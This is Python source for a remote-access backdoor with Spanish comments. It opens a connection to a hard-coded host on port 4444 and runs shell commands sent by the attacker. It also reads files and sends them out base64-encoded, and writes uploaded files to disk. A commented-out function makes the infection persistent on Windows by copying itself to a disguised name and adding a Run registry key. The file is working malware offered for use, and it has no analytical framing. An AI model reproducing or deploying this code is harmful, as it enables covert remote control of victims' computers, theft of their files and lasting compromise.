import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

#    este proceso hace que la computadora con Windows se infecte de forma permanente, y cada que encienda la computadora tener control sobre ella.
#    def become_persistent(self):
#        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exr"
#        if not os.path.exists(evil_file_location):
#            shutil.copyfile(sys.executable, evil_file_location)
#            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
        
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(self, command): #Ejecuta el comando que envia el atacante
        return subprocess.check_output(command, shell=True) #Ejecuta el comando que envia el atacante
    
    def cambiar_directorio(self, path):
        os.chdir(path)
        return "[+] Cambiando directorio a " + path
    
    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Subida Completa."
        
    def run(self):
        while True:
            command=self.reliable_recive() #Obtiene el comando escrito por el atacante
            
            try:
                if command[0] == "salir":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    resultados_comando = self.cambiar_directorio(command[1])
                elif command[0] == "descargar":
                    resultados_comando = self.leer_archivo(command[1])
                elif command[0] == "subir":
                    resultados_comando = self.escribir_archivo(command[1])
                else:
                    resultados_comando = self.ejecutar_comando(command) #Se guardan lso resultados obtenidos
            except Exception:
                resultados_comando = "[-] Error durante la ejecucion del comando."
                
            
            self.reliable_send(resultados_comando) #Envia lo obtenido en pantalla al ejecutar el comando del atacante
        
puerta  = Backdoor("192.168.100.40", 4444) #Direccion ip del servidor a donde van los datos
puerta.run()